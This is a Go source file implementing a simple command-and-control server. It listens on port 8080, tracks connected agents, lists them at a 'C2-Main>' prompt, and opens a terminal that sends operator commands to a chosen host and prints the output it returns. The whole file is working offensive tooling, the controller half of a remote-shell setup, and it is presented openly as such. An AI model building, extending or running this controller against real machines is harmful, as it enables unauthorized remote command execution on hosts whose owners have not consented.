package main

import (
	"fmt"
	"log"
	"net"
	"os" 
	"bufio"
	"sync"
	"strconv"
)

var (
	connections = make(map[int]net.Conn) // map of sockets
	nextID = 1
	postMu sync.Mutex
)

func main() {
	// listen for connections
	go func() {
		ln, err := net.Listen("tcp", ":8080")
		if err != nil {
			log.Fatalln(err)
		}

		defer ln.Close()

		for {
			conn, err := ln.Accept()
			if err != nil {
				log.Println(err)
			}

			handleConnection(conn)
		}
	}()
	
	// listen for user input
	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("C2-Main> ")
		scanner.Scan()
		command := scanner.Text()
		if command == "show-conn" {
			printConnections()
		} else if command == "exit"{
			break	
		} else if len(command) >= 9 && command[:8] == "connect " {
			hostInteract(command[8])
		} else if len(command) > 0{
			fmt.Println("command not recognized")
		}
	}

	closeConnection()
}

// takes a socket as input, adds that socket to the 
// map of sockets, and print the socket's ip
func handleConnection(conn net.Conn) {
	//defer conn.Close()
	postMu.Lock()
	defer postMu.Unlock()
	
	connections[nextID] = conn
	nextID++
	
	fmt.Println("\n[+] connected to ", conn.RemoteAddr().(*net.TCPAddr), "[press Enter to continue]")
}

// handles the user command "show-conn" and 
// displays connections
func printConnections() {
	postMu.Lock()
	defer postMu.Unlock()
	fmt.Println("Available hosts:")
	for id, address := range connections{
		fmt.Println(id, "->", address.RemoteAddr().(*net.TCPAddr))
	}

	if len(connections) == 0 {
		fmt.Println("No Connections yet")
	}
}

// takes a byte as input representing the number of host
// input by the user, checks if it's in map and calls hostTerminal
func hostInteract(connectNum byte) {
	postMu.Lock()
	defer postMu.Unlock()

	hostNum, _ := strconv.Atoi(string(connectNum))
	sock, ok := connections[hostNum]
	if !ok {
		fmt.Println("host", hostNum,  "not available")
	} else{
		hostTerminal(hostNum, sock)
	}
}

// takes in the number of host and the socket it corresponds with
// handles user input when connected to a host
func hostTerminal(hostNum int, sock net.Conn) {
	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("host-" + strconv.Itoa(hostNum) + "> ")
		scanner.Scan()
		command := scanner.Text()
		if command == "exit" {
			break;
		} else if len(command) > 0{
			_, err := sock.Write([]byte(command))
			if err != nil{
				fmt.Println("error sending message")
			}
			
			for {
				buff := make([]byte, 1024)
				n, errTwo := sock.Read(buff)
				if errTwo != nil {
					fmt.Println("nothing received")
					break
				}

				if n > 0{
					output := string(buff[:n])
					if output == "<<AGENT_DONE>>"{
						break
					}
					fmt.Printf(output)
				}

			}

		}
	}
}

// closes all socket connections
func closeConnection() {
	for _, address := range connections{
		address.Close()
	}
	fmt.Println("All connections closed")
}
